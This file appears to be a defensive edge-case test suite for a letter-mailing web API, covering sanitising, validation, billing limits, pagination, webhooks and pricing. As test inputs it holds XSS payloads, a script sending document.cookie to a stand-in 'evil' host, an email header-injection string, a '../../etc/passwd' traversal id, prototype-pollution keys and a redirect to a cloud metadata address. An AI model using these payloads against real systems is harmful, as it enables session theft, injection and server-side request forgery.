// Edge cases and hostile situations, run against the in-memory database (fast).
// The real-Postgres counterpart is tests/pg-real.test.mts.
import test from "node:test";
import assert from "node:assert/strict";

process.env.DATABASE_URL = "postgres://test";
process.env.RESEND_API_KEY = "re_test";
process.env.CRON_SECRET = "s3cret-s3cret-s3cret";
delete process.env.CANNER_FILES_TOKEN;

const pg = await import("./mocks/pg.mts");
const resend = await import("./mocks/resend.mts");
const stripeMock = await import("./mocks/stripe.mts");
const nextMock = await import("./mocks/next-server.mts");
const { quote, RATES, MAX_PAGES } = await import("../src/lib/pricing.ts");
const { VOLUME, volumeBaseCents } = await import("../src/lib/volume-curve.ts");
const { estimateVolume } = await import("../src/lib/volume.ts");
const { hashApiKey } = await import("../src/lib/api-auth.ts");
const { resetRateLimits } = await import("../src/lib/rate-limit.ts");
const { sanitizeLetterHtml, LETTER_CSP, escapeHtml, stripControl } = await import("../src/lib/sanitize.ts");
const { torontoDayStart, torontoMonthStart } = await import("../src/lib/api-limits.ts");
const { letterEconomics, MIN_NET_CENTS } = await import("../src/lib/margin.ts");
const send = await import("../src/app/api/v1/send/route.ts");
const lettersRoute = await import("../src/app/api/v1/letters/route.ts");
const letterRoute = await import("../src/app/api/v1/letters/[id]/route.ts");
const batchRoute = await import("../src/app/api/v1/letters/batch/route.ts");
const quoteRoute = await import("../src/app/api/v1/quote/route.ts");
const pricingRoute = await import("../src/app/api/v1/pricing/route.ts");
const webhooksRoute = await import("../src/app/api/v1/webhooks/route.ts");
const fulfil = await import("../src/app/api/fulfil/route.ts");
const wh = await import("../src/lib/webhooks.ts");
const { fulfilParams } = await import("../src/lib/fulfil-links.ts");

const ACCT = "acct-1";
const LIVE = "sl_live_" + "a".repeat(64);
const TEST = "sl_test_" + "b".repeat(64);
const addr = (name: string) => ({ name, line1: "1 Main St", city: "Toronto", province: "ON", postal_code: "M5V 1A1", country: "CA" });
const draft = (extra: Record<string, unknown> = {}, to = "Recipient") => ({ from: addr("Sender"), to: addr(to), mode: "draft", letter: { body: "Hello." }, ...extra });
const req = (body: unknown, headers: Record<string, string> = {}, raw = false) =>
  new Request("http://x/api/v1/letters", { method: "POST", headers: { "content-type": "application/json", ...headers }, body: raw ? (body as string) : JSON.stringify(body) });
const post = (body: unknown, key = LIVE, headers: Record<string, string> = {}) => req(body, { authorization: `Bearer ${key}`, ...headers });
const get = (url: string, key = LIVE) => new Request(url, { headers: { authorization: `Bearer ${key}` } });
const del = (key = LIVE) => new Request("http://x", { method: "DELETE", headers: { authorization: `Bearer ${key}` } });
const ctx = (id: string) => ({ params: Promise.resolve({ id }) });
const daysAgo = (d: number) => new Date(Date.now() - d * 86400_000).toISOString();

function setup({ paid = true }: { paid?: boolean } = {}) {
  pg.seed("sendletter_accounts", [{ id: ACCT, email: "dev@example.com", has_payment_method: true, stripe_customer_id: "cus_1" }]);
  pg.seed("sendletter_api_keys", [
    { id: "key-live", account_id: ACCT, key_hash: hashApiKey(LIVE), livemode: true },
    { id: "key-test", account_id: ACCT, key_hash: hashApiKey(TEST), livemode: false },
  ]);
  if (paid) pg.seed("sendletter_invoices", [{ account_id: ACCT, kind: "first_order", status: "paid", letters: 1, total_cents: 300 }]);
}

test.beforeEach(() => {
  pg.reset(); resend.clear(); stripeMock.clear(); resetRateLimits();
  globalThis.fetch = (() => { throw new Error("unexpected network call"); }) as typeof fetch;
  wh.__setLookup(async () => [{ address: "93.184.216.34" }]);
});

// ── Letter HTML that the owner opens in a browser ───────────────

test("sanitizer: scripts, handlers, frames and javascript: URLs are gone; letters survive", () => {
  const bad = [
    `<script>alert(1)</script>`, `<SCRIPT SRC=//evil/x.js></SCRIPT>`, `<scr<script>alert(1)</script>ipt>alert(2)</script>`,
    `<img src=x onerror=alert(1)>`, `<p onclick="evil()">hi</p>`, `<a href="javascript:alert(1)">x</a>`, `<a href=" JavaScript:alert(1)">x</a>`,
    `<iframe src="https://evil"></iframe>`, `<object data="x"></object>`, `<embed src="x">`, `<form action="https://evil"><input name=a></form>`,
    `<meta http-equiv="refresh" content="0;url=https://evil">`, `<base href="https://evil/">`, `<link rel="stylesheet" href="https://evil/x.css">`,
    `<svg onload=alert(1)><circle/></svg>`, `<a href="data:text/html;base64,PHNjcmlwdD4=">x</a>`, `<div onmouseover = 'x()'>y</div>`,
  ];
  for (const b of bad) {
    const out = sanitizeLetterHtml(`<p>Dear Jo,</p>${b}<p>Regards</p>`);
    assert.doesNotMatch(out, /<script|<iframe|<object|<embed|<form|<svg|<base|<link|<meta|\son\w+\s*=|javascript:|vbscript:|data\s*:\s*text\/html/i, `survived: ${b} -> ${out}`);
    assert.match(out, /Dear Jo,/);
    assert.match(out, /Regards/);
  }
  const good = `<table style="width:100%"><tr><td><b>Bold</b> <i>it</i></td></tr></table><img src="https://example.com/logo.png" alt="logo"><img src="data:image/png;base64,AAAA"><ul><li>one</li></ul>`;
  assert.equal(sanitizeLetterHtml(good), good, "ordinary letter markup is untouched");
});

test("formatted mode: the attached letter.html is sanitized and carries a strict CSP", async () => {
  setup();
  const res = await send.POST(post({ from: addr("S"), to: addr("R"), mode: "formatted", page_count: 1, html: `<p>Hi</p><script>fetch("https://evil/"+document.cookie)</script><img src=x onerror=alert(1)>` }));
  assert.equal(res.status, 200);
  const att = resend.sent[0].attachments!.find((a) => a.filename === "letter.html")!;
  const html = Buffer.from(att.content, "base64").toString();
  assert.ok(html.includes(LETTER_CSP), "CSP present");
  assert.match(html, /default-src 'none'/);
  assert.doesNotMatch(html, /<script|onerror/i);
  assert.match(html, /<p>Hi<\/p>/);
});

test("escaping: control characters and markup never reach the email subject or body unescaped", async () => {
  setup();
  const res = await send.POST(post(draft({}, "Eve\r\nBcc: attacker@example.com <img src=x onerror=1>")));
  assert.equal(res.status, 200);
  const m = resend.sent[0];
  assert.doesNotMatch(m.subject, /[\r\n]/, "no header injection");
  assert.doesNotMatch(m.html, /<img src=x/);
  assert.equal(stripControl("a\u0000b​c\u007F"), "abc");
  assert.equal(escapeHtml(`<a href="x">&'`), "&lt;a href=&quot;x&quot;&gt;&amp;&#39;");
});

// ── Addresses ───────────────────────────────────────────────────

test("postal codes: a delivery address needs the full code; the return address may be looser", async () => {
  setup();
  for (const pc of ["M5V", "M5V 1A", "5MV 1A1", "M5V 1A1X", "", "K1A-0B1"]) {
    const r = await send.POST(post(draft({ to: { ...addr("R"), postal_code: pc } })));
    assert.equal(r.status, 400, `to.postal_code "${pc}"`);
  }
  assert.equal((await send.POST(post(draft({ to: { ...addr("R"), postal_code: "m5v1a1" } })))).status, 200, "lower case, no space");
  assert.equal((await send.POST(post(draft({ from: { ...addr("S"), postal_code: "M5V" } })))).status, 200, "a return address may be an FSA");
  const missing = await send.POST(post(draft({ to: { name: "R", line1: "1 St", city: "Toronto", province: "ON" } })));
  assert.equal(missing.status, 400);
  assert.match((await missing.json()).error, /postal_code is required/);
});

test("addresses: field length limits, missing parts and unusual-but-valid text", async () => {
  setup();
  const long = (n: number) => "x".repeat(n);
  assert.equal((await send.POST(post(draft({ to: { ...addr("R"), line1: long(200) } })))).status, 200);
  assert.equal((await send.POST(post(draft({ to: { ...addr("R"), line1: long(201) } })))).status, 400);
  assert.equal((await send.POST(post(draft({ to: { ...addr("R"), name: "" } })))).status, 400);
  assert.equal((await send.POST(post(draft({ to: { ...addr("R"), city: "   " } })))).status, 400);
  assert.equal((await send.POST(post(draft({ to: { ...addr("R"), country: "ca" } })))).status, 200, "country is case-insensitive");
  assert.equal((await send.POST(post(draft({ to: { ...addr("R"), country: "CAN" } })))).status, 400);
  assert.equal((await send.POST(post(draft({ to: { ...addr("R"), name: "Zoë Müller-Łukasiewicz 李雷 😀" } })))).status, 200);
  assert.equal((await send.POST(post(draft({ from: null })))).status, 400);
  assert.equal((await send.POST(post(draft({ to: "123 Main St" })))).status, 400);
});

// ── Requests that are not what they should be ───────────────────

test("auth: header variants", async () => {
  setup();
  const ok = (h: string) => send.POST(req(draft(), { authorization: h })).then((r) => r.status);
  assert.equal(await ok(`Bearer ${LIVE}`), 200);
  assert.equal(await ok(`bearer ${LIVE}`), 401, "scheme is case-sensitive here");
  assert.equal(await ok(`Bearer  ${LIVE}`), 401, "double space");
  assert.equal(await ok(LIVE), 401, "no scheme");
  assert.equal(await ok(`Bearer sl_live_${"a".repeat(63)}`), 401);
  assert.equal(await ok(`Bearer sl_live_${"A".repeat(64)}`), 401, "upper-case hex is a different key");
  assert.equal(await ok(`Bearer sk_live_${"a".repeat(64)}`), 401, "a Stripe-looking key");
  assert.equal(await ok("Basic abc"), 401);
  assert.equal(await send.POST(req(draft())).then((r) => r.status), 401, "no header at all");
});

test("bodies: empty, null, array, string, broken and deeply nested JSON are 400, never 500", async () => {
  setup();
  const h = { authorization: `Bearer ${LIVE}` };
  for (const raw of ["", "null", "[]", "\"str\"", "42", "{", "{\"mode\":", "not json"]) {
    const r = await send.POST(req(raw, h, true));
    assert.equal(r.status, 400, `body ${JSON.stringify(raw)}`);
    assert.ok((await r.json()).code);
  }
  // Nesting thousands of levels deep must be a clean 400, not a stack overflow somewhere below.
  const nested = (n: number) => '{"a":'.repeat(n) + "1" + "}".repeat(n);
  for (const depth of [40, 3000]) {
    const r = await send.POST(req(`{"mode":"draft","metadata":${nested(depth)}}`, h, true));
    assert.equal(r.status, 400, `depth ${depth}: ${r.status}`);
    assert.match((await r.json()).error, /nested|metadata|required|invalid/i);
  }
  const bq = await batchRoute.POST(new Request("http://x", { method: "POST", headers: { ...h, "content-type": "application/json", "idempotency-key": "deep" }, body: `{"letters":[${nested(500)}]}` }));
  assert.equal(bq.status, 400);
  assert.equal((await quoteRoute.POST(new Request("http://x", { method: "POST", body: nested(500) }))).status, 400);
  assert.equal((await send.POST(req({ ...draft(), mode: ["draft"] }, h))).status, 400);
  assert.equal((await send.POST(req({ ...draft(), letter_size: { x: 1 } }, h))).status, 400);
  assert.equal((await send.POST(req({ ...draft(), letter: "just a string" }, h))).status, 400);
  assert.equal((await send.POST(req({ ...draft(), letter: { body: 12345 } }, h))).status, 400);
});

test("metadata and reference: prototype-pollution keys and control characters are harmless", async () => {
  setup();
  const res = await send.POST(req(`{"from":${JSON.stringify(addr("S"))},"to":${JSON.stringify(addr("R"))},"mode":"draft","letter":{"body":"x"},"reference":"a\\u0000b\\nc","metadata":{"__proto__":"x","constructor":"y","k":"v\\u0007"}}`, { authorization: `Bearer ${LIVE}` }, true));
  assert.equal(res.status, 200);
  const j = await res.json();
  assert.equal(j.reference, "ab\nc");
  assert.equal(({} as Record<string, unknown>).polluted, undefined);
  assert.equal(Object.getPrototypeOf(j.metadata), Object.prototype);
  assert.equal(j.metadata.k, "v");
  assert.equal(Object.keys(j.metadata).includes("constructor"), true);
});

test("idempotency keys: 255 characters ok, 256 not; unicode and spaces not; batch-derived keys do not clash with single ones", async () => {
  setup();
  assert.equal((await send.POST(post(draft(), LIVE, { "idempotency-key": "k".repeat(255) }))).status, 200);
  assert.equal((await send.POST(post(draft(), LIVE, { "idempotency-key": "k".repeat(256) }))).status, 400);
  assert.equal((await send.POST(post(draft(), LIVE, { "idempotency-key": "clé" }))).status, 400);
  assert.equal((await send.POST(post(draft(), LIVE, { "idempotency-key": "" }))).status, 400);
  // a single request whose key looks like "<batch key>:0" is a different request from batch item 0
  const mk = (key: string) => new Request("http://x", { method: "POST", headers: { "content-type": "application/json", authorization: `Bearer ${LIVE}`, "idempotency-key": key }, body: JSON.stringify({ letters: [draft()] }) });
  assert.equal((await (await batchRoute.POST(mk("b"))).json()).created, 1);
  const clash = await send.POST(post(draft({ reference: "other" }), LIVE, { "idempotency-key": "b:0" }));
  assert.equal(clash.status, 422, "same derived key, different request: refused, not duplicated");
  assert.equal(pg.rows("sendletter_orders").filter((o) => o.reference === "other").length, 0, "the clashing request created nothing");
});

// ── Money boundaries ────────────────────────────────────────────

test("daily limit: exactly at the limit is allowed, one cent over is refused", async () => {
  setup();
  const price = quote({ pages: 1, size: "standard", colour: false, duplex: true, channel: "api", priorMailings: 0 }).totalCents; // 248
  pg.rows("sendletter_accounts")[0].daily_spend_limit_cents = price;
  assert.equal((await send.POST(post(draft()))).status, 200, "spends exactly the limit");
  assert.equal((await send.POST(post(draft()))).status, 429, "anything more is over");
  // One cent short of room for the next letter (which, as the account's 2nd mailing, is cheaper than the 1st).
  const next = quote({ pages: 1, size: "standard", colour: false, duplex: true, channel: "api", priorMailings: 1 }).totalCents;
  pg.rows("sendletter_accounts")[0].daily_spend_limit_cents = price + next - 1;
  assert.equal((await send.POST(post(draft()))).status, 429, "one cent short of room");
  pg.rows("sendletter_accounts")[0].daily_spend_limit_cents = price + next;
  assert.equal((await send.POST(post(draft()))).status, 200, "exactly enough room");
});

test("limits: a user limit above the approved cap is clamped to the cap", async () => {
  setup();
  pg.rows("sendletter_accounts")[0].daily_spend_limit_cents = 10_000_000;
  pg.rows("sendletter_accounts")[0].daily_spend_cap_cents = 100;
  assert.equal((await send.POST(post(draft()))).status, 429, "the cap of $1.00 wins");
});

test("billing: three letters sent at once on a brand-new account charge the card once, up front", async () => {
  setup({ paid: false });
  const rs = await Promise.all([1, 2, 3].map((i) => send.POST(post(draft({}, `R${i}`)))));
  assert.deepEqual(rs.map((r) => r.status), [200, 200, 200]);
  assert.equal(stripeMock.intents.length, 1, "one up-front charge, not three");
  assert.equal(pg.rows("sendletter_invoices").filter((i) => i.status === "paid").length, 1);
  assert.equal(pg.rows("sendletter_api_usage").filter((u) => u.billed).length, 1);
});

test("billing: a customer with no Stripe customer cannot send a first letter, and nothing is created", async () => {
  pg.seed("sendletter_accounts", [{ id: ACCT, email: "x", has_payment_method: true, stripe_customer_id: null }]);
  pg.seed("sendletter_api_keys", [{ id: "k", account_id: ACCT, key_hash: hashApiKey(LIVE), livemode: true }]);
  const res = await send.POST(post(draft()));
  assert.equal(res.status, 402);
  assert.equal((await res.json()).code, "payment_failed");
  assert.equal(resend.sent.length, 0);
});

test("cancel: when the refund fails the letter is still cancelled, the owner is told, and the customer sees refund_pending", async () => {
  setup({ paid: false });
  const j = await (await send.POST(post(draft()))).json(); // charged up front
  stripeMock.failRefundsWith("stripe is down");
  resend.clear();
  const res = await letterRoute.DELETE(del(), ctx(j.id));
  const body = await res.json();
  assert.equal(res.status, 200);
  assert.equal(body.status, "cancelled");
  assert.equal(body.refunded_cents, 0);
  assert.equal(body.refund_pending, true);
  assert.match(resend.sent[0].subject, /REFUND FAILED/);
  assert.match(resend.sent[0].html, /refund it in Stripe by hand/);
  assert.ok(pg.rows("sendletter_api_usage")[0].voided_at, "billing is voided regardless");
});

// ── Lists, cursors, scoping ─────────────────────────────────────

test("list: letters created in the same instant are all returned across pages, none twice", async () => {
  setup();
  const t = new Date().toISOString();
  const ids = Array.from({ length: 7 }, (_, i) => `00000000-0000-4000-8000-00000000000${i}`);
  pg.seed("sendletter_orders", ids.map((id, i) => ({ id, api_account_id: ACCT, livemode: true, created_at: t, to_name: `R${i}`, status: "pending" })));
  const seen: string[] = [];
  let cursor = "";
  for (let n = 0; n < 10; n++) {
    const j = await (await lettersRoute.GET(get(`http://x/api/v1/letters?limit=3${cursor}`))).json();
    seen.push(...j.data.map((l: { id: string }) => l.id));
    if (!j.has_more) break;
    cursor = `&starting_after=${j.data.at(-1).id}`;
  }
  assert.equal(new Set(seen).size, 7);
  assert.equal(seen.length, 7, "no duplicates");
});

test("list and get: bad cursors, other accounts' ids, bad uuids and out-of-range limits", async () => {
  setup();
  assert.equal((await lettersRoute.GET(get("http://x/api/v1/letters?starting_after=nope"))).status, 400);
  assert.equal((await lettersRoute.GET(get("http://x/api/v1/letters?starting_after=00000000-0000-4000-8000-0000000000ff"))).status, 400);
  assert.equal((await (await lettersRoute.GET(get("http://x/api/v1/letters?limit=0"))).json()).data.length, 0);
  assert.equal((await lettersRoute.GET(get("http://x/api/v1/letters?limit=abc"))).status, 200);
  assert.equal((await lettersRoute.GET(get("http://x/api/v1/letters?limit=100000"))).status, 200);
  assert.equal((await letterRoute.GET(get("http://x/x"), ctx("../../etc/passwd"))).status, 404);
  assert.equal((await letterRoute.DELETE(del(), ctx("not-a-uuid"))).status, 404);
  assert.equal((await letterRoute.DELETE(del(TEST), ctx("00000000-0000-4000-8000-0000000000ff"))).status, 404);
});

// ── Batches ─────────────────────────────────────────────────────

test("batch: when time runs out the rest are not_processed, and re-sending finishes them without repeating the first", async () => {
  setup();
  const letters = [draft({}, "A"), draft({}, "B"), draft({}, "C"), draft({}, "D")];
  const mk = () => new Request("http://x", { method: "POST", headers: { "content-type": "application/json", authorization: `Bearer ${LIVE}`, "idempotency-key": "slow" }, body: JSON.stringify({ letters }) });
  const realNow = Date.now;
  let calls = 0;
  // The first two letters start immediately; from the third, the clock has jumped past the 45 second budget.
  Date.now = () => (calls++ < 4 ? realNow() : realNow() + 60_000);
  let first;
  try { first = await (await batchRoute.POST(mk())).json(); } finally { Date.now = realNow; }
  assert.ok(first.not_processed >= 1, JSON.stringify(first.results.map((r: { status: string }) => r.status)));
  assert.equal(first.created + first.not_processed + first.failed, 4);
  const again = await (await batchRoute.POST(mk())).json();
  assert.equal(again.not_processed, 0);
  assert.equal(again.created + again.replayed, 4);
  assert.equal(again.replayed, first.created, "the letters made the first time are replayed, not remade");
  assert.equal(pg.rows("sendletter_api_usage").length, 4, "four letters, billed once each");
});

test("batch: items that are not objects fail individually; a batch of 100 is accepted", async () => {
  setup();
  const mk = (letters: unknown[], key = "k1") => new Request("http://x", { method: "POST", headers: { "content-type": "application/json", authorization: `Bearer ${LIVE}`, "idempotency-key": key }, body: JSON.stringify({ letters }) });
  const j = await (await batchRoute.POST(mk([draft(), null, "x", [], 7, draft({}, "B")]))).json();
  assert.deepEqual(j.results.map((r: { status: string }) => r.status), ["created", "error", "error", "error", "error", "created"]);
  const hundred = await batchRoute.POST(mk(Array.from({ length: 100 }, (_, i) => draft({}, `R${i}`)), "k100"));
  assert.equal(hundred.status, 200);
  assert.equal((await hundred.json()).created, 100);
});

// ── Webhooks, failure modes ─────────────────────────────────────

const hook = (body: unknown, key = LIVE) => new Request("http://x/api/v1/webhooks", { method: "POST", headers: { "content-type": "application/json", authorization: `Bearer ${key}` }, body: JSON.stringify(body) });

test("webhooks: a redirect is a failure (never followed), a timeout is retried, and the 11th endpoint is refused", async () => {
  setup();
  let mode: "redirect" | "hang" = "redirect";
  const calls: { redirect?: string }[] = [];
  globalThis.fetch = (async (_u: URL, init: RequestInit) => {
    calls.push({ redirect: init.redirect as string });
    if (mode === "redirect") return new Response(null, { status: 302, headers: { location: "http://169.254.169.254/latest/meta-data/" } });
    throw Object.assign(new Error("The operation was aborted"), { name: "AbortError" });
  }) as typeof fetch;
  await webhooksRoute.POST(hook({ url: "https://example.com/h" }));
  await send.POST(post(draft()));
  await nextMock.flushAfter();
  assert.equal(calls[0].redirect, "manual", "redirects are not followed");
  let d = pg.rows("sendletter_webhook_deliveries")[0];
  assert.equal(d.status, "pending");
  assert.equal(d.last_status_code, 302);
  mode = "hang";
  d.next_attempt_at = new Date(Date.now() - 1000).toISOString();
  await wh.retryDueDeliveries();
  d = pg.rows("sendletter_webhook_deliveries")[0];
  assert.equal(d.attempts, 2);
  assert.match(String(d.last_error), /aborted/);
  assert.equal(d.last_status_code, null);

  for (let i = 0; i < 9; i++) assert.equal((await webhooksRoute.POST(hook({ url: `https://example.com/h${i}` }))).status, 201);
  const eleventh = await webhooksRoute.POST(hook({ url: "https://example.com/h-too-many" }));
  assert.equal(eleventh.status, 400);
});

test("webhooks: the verification snippet in the docs accepts a good signature and rejects tampering, old timestamps and wrong secrets", async () => {
  const { createHmac, timingSafeEqual } = await import("node:crypto");
  // Copied from the docs page.
  function verify(secret: string, header: string, rawBody: string, now = Date.now()) {
    const { t, v1 } = Object.fromEntries(header.split(",").map((p) => p.split("=")));
    if (Math.abs(now / 1000 - Number(t)) > 300) return false;
    const want = createHmac("sha256", secret).update(t + "." + rawBody).digest("hex");
    return want.length === v1.length && timingSafeEqual(Buffer.from(want), Buffer.from(v1));
  }
  const secret = wh.generateWebhookSecret();
  const body = JSON.stringify({ hello: "wörld" });
  const header = wh.signPayload(secret, body);
  assert.equal(verify(secret, header, body), true);
  assert.equal(verify(secret, header, body + " "), false);
  assert.equal(verify(wh.generateWebhookSecret(), header, body), false);
  assert.equal(verify(secret, header, body, Date.now() + 10 * 60_000), false, "replayed ten minutes later");
  assert.equal(verify(secret, "t=1,v1=zz", body), false);
});

test("fulfil: marking mailed twice, and printed after mailed, change nothing the second time", async () => {
  setup();
  const OID = "11111111-2222-3333-4444-555555555555";
  pg.seed("sendletter_orders", [{ id: OID, api_account_id: ACCT, livemode: true, status: "pending", to_name: "J", to_city: "M", price_breakdown: quote({ pages: 1, size: "standard", colour: false, duplex: true, channel: "api" }) }]);
  const fire = (a: "printed" | "mailed") => fulfil.POST(new Request("http://x", { method: "POST", body: new URLSearchParams(fulfilParams(OID, a)) }));
  await fire("mailed"); await fire("mailed"); await fire("printed");
  await nextMock.flushAfter();
  assert.deepEqual(pg.rows("sendletter_webhook_events").map((e) => e.type), ["letter.printed", "letter.mailed"], "each event once");
  assert.equal(pg.rows("sendletter_orders")[0].status, "mailed", "printed after mailed does not move it back");
});

// ── Pricing engine: properties ──────────────────────────────────

function lcg(seed: number) { let s = seed; return () => (s = (s * 1664525 + 1013904223) % 4294967296) / 4294967296; }

test("quote: invariants hold for 3,000 random letters", () => {
  const rnd = lcg(20261126);
  const sizes = ["standard", "large", "legal"] as const;
  for (let i = 0; i < 3000; i++) {
    const pages = 1 + Math.floor(rnd() * MAX_PAGES);
    const size = sizes[Math.floor(rnd() * 3)];
    const colour = rnd() < 0.5, duplex = rnd() < 0.5;
    const channel = rnd() < 0.5 ? "api" : "web";
    const prior = channel === "api" && rnd() < 0.7 ? Math.floor(rnd() * 400) : undefined;
    const q = quote({ pages, size, colour, duplex, channel, priorMailings: prior });
    const ctx = JSON.stringify({ pages, size, colour, duplex, channel, prior });
    assert.equal(q.lines.reduce((s, l) => s + l.totalCents, 0), q.totalCents, `lines sum ${ctx}`);
    assert.equal(q.mailings.reduce((s, m) => s + m.pages, 0), pages, `pages are all carried ${ctx}`);
    assert.equal(q.mailings.reduce((s, m) => s + m.stamps, 0), q.stamps, ctx);
    assert.equal(q.postageCents, q.stamps * RATES.stampCents, ctx);
    for (const m of q.mailings) {
      assert.ok(m.stamps * RATES.stampCents >= m.requiredPostageCents, `never short on postage ${ctx}`);
      assert.ok(m.weightGrams <= 500, `within the Lettermail limit ${ctx}`);
      assert.ok(m.stamps >= 1);
    }
    for (let j = 1; j < q.mailings.length; j++) assert.equal(q.mailings[j].pageStart, q.mailings[j - 1].pageEnd + 1, "contiguous page ranges");
    assert.ok(Number.isInteger(q.totalCents) && q.totalCents > 0);
    if (channel === "api" && prior !== undefined) assert.ok(q.volume!.discountCents >= 0, ctx);
    if (channel === "web") assert.equal(q.volume, undefined);
  }
});

test("quote: more pages never cost less; a later mailing never costs more (all else equal)", () => {
  for (const size of ["standard", "large", "legal"] as const) {
    let prev = 0;
    for (let pages = 1; pages <= MAX_PAGES; pages++) {
      const t = quote({ pages, size, colour: false, duplex: true, channel: "api", priorMailings: 0 }).totalCents;
      assert.ok(t >= prev, `${size} ${pages} pages`);
      prev = t;
    }
  }
  let prev = Infinity;
  for (let prior = 0; prior < 500; prior++) {
    const t = quote({ pages: 3, size: "standard", colour: true, duplex: true, channel: "api", priorMailings: prior }).totalCents;
    assert.ok(t <= prev, `prior ${prior}`);
    prev = t;
  }
});

test("quote: input extremes are refused cleanly", () => {
  for (const pages of [0, -1, 1.5, NaN, Infinity, MAX_PAGES + 1]) assert.throws(() => quote({ pages, size: "standard", colour: false, duplex: true, channel: "web" }), /pages must be/);
  assert.throws(() => quote({ pages: 1, size: "huge" as never, colour: false, duplex: true, channel: "web" }), /unknown letter size/);
  assert.equal(quote({ pages: 1, size: "standard", colour: false, duplex: true, channel: "api", priorMailings: -50 }).volume!.priorMailings, 0);
  assert.equal(quote({ pages: 1, size: "standard", colour: false, duplex: true, channel: "api", priorMailings: 1e12 }).totalCents, VOLUME.floorCents + 10 + 15 + 124);
});

test("margin: no letter at any volume, size or colour loses money after Stripe's fees", () => {
  const rnd = lcg(7);
  for (let i = 0; i < 2000; i++) {
    const pages = 1 + Math.floor(rnd() * 30);
    const size = (["standard", "large", "legal"] as const)[Math.floor(rnd() * 3)];
    const q = quote({ pages, size, colour: rnd() < 0.5, duplex: rnd() < 0.5, channel: "api", priorMailings: Math.floor(rnd() * 600) });
    const e = letterEconomics(q, 100);
    assert.ok(e.netCents > 0, `loss on ${JSON.stringify({ pages, size, prior: q.volume!.priorMailings })}: ${e.netCents.toFixed(1)}c`);
  }
  assert.ok(MIN_NET_CENTS > 0);
});

test("estimate and pricing endpoint: huge volumes answer instantly and sensibly", async () => {
  const t0 = Date.now();
  const e = estimateVolume({ lettersPerMonth: 1_000_000, pages: 200, size: "legal", colour: true, duplex: true });
  assert.ok(Date.now() - t0 < 500, "no per-letter loop to a million");
  assert.ok(e.steady_state_month_cents > 0 && Number.isFinite(e.first_30_days_cents));
  assert.equal((await pricingRoute.GET(new Request("http://x/api/v1/pricing?letters_per_month=1000000&pages=200"))).status, 200);
  for (const qs of ["letters_per_month=-1", "letters_per_month=1.5", "letters_per_month=abc", "letters_per_month=1000001", "letters_per_month=5&pages=0", "letters_per_month=5&pages=201", "letters_per_month=5&letter_size=huge"]) {
    assert.equal((await pricingRoute.GET(new Request(`http://x/api/v1/pricing?${qs}`))).status, 400, qs);
  }
});

test("quote endpoint: odd inputs", async () => {
  const q = (b: unknown) => quoteRoute.POST(new Request("http://x", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify(b) }));
  assert.equal((await q({ pages: "3" })).status, 200, "a numeric string is accepted");
  assert.equal((await q({ pages: 1.5 })).status, 400);
  assert.equal((await q({ pages: null })).status, 400);
  assert.equal((await q({ pages: 1, letters_in_last_30_days: -1 })).status, 400);
  assert.equal((await q({ pages: 1, letters_in_last_30_days: "many" })).status, 400);
  assert.equal((await q({ pages: 1, colour: "yes" })).status, 400);
  assert.equal((await q([])).status, 400);
});

// ── Time ────────────────────────────────────────────────────────

test("time: Toronto day and month boundaries are right across both daylight-saving changes", () => {
  const iso = (d: Date) => d.toISOString();
  // Spring forward 2027-03-14 (02:00 EST -> EDT): the 14th starts at 05:00Z, the 15th at 04:00Z, a 23-hour day.
  assert.equal(iso(torontoDayStart(new Date("2027-03-14T12:00:00Z"))), "2027-03-14T05:00:00.000Z");
  assert.equal(iso(torontoDayStart(new Date("2027-03-15T12:00:00Z"))), "2027-03-15T04:00:00.000Z");
  // Fall back 2026-11-01: the 1st starts at 04:00Z (EDT), the 2nd at 05:00Z (EST): a 25-hour day.
  assert.equal(iso(torontoDayStart(new Date("2026-11-01T12:00:00Z"))), "2026-11-01T04:00:00.000Z");
  assert.equal(iso(torontoDayStart(new Date("2026-11-02T12:00:00Z"))), "2026-11-02T05:00:00.000Z");
  // The last instant of a Toronto day and the first of the next.
  assert.equal(iso(torontoDayStart(new Date("2026-12-01T04:59:59Z"))), "2026-11-30T05:00:00.000Z");
  assert.equal(iso(torontoDayStart(new Date("2026-12-01T05:00:00Z"))), "2026-12-01T05:00:00.000Z");
  assert.equal(iso(torontoMonthStart(new Date("2026-12-01T04:59:59Z"))), "2026-11-01T04:00:00.000Z");
  assert.equal(iso(torontoMonthStart(new Date("2026-12-01T05:00:00Z"))), "2026-12-01T05:00:00.000Z");
  assert.equal(iso(torontoMonthStart(new Date("2027-01-01T04:59:59Z"))), "2026-12-01T05:00:00.000Z");
  assert.equal(iso(torontoMonthStart(new Date("2027-03-31T23:59:59Z"))), "2027-03-01T05:00:00.000Z");
  assert.equal(iso(torontoMonthStart(new Date("2027-04-01T04:00:00Z"))), "2027-04-01T04:00:00.000Z");
  void volumeBaseCents; void daysAgo;
});

test("csv: Date objects (what Postgres returns) are written as plain ISO timestamps; nested values as JSON", async () => {
  const { toCsv } = await import("../src/lib/csv.ts");
  const d = new Date("2026-11-26T20:53:20.273Z");
  assert.equal(toCsv(["when", "meta"], [[d, { a: 1 }]]), 'when,meta\r\n2026-11-26T20:53:20.273Z,"{""a"":1}"\r\n');
});
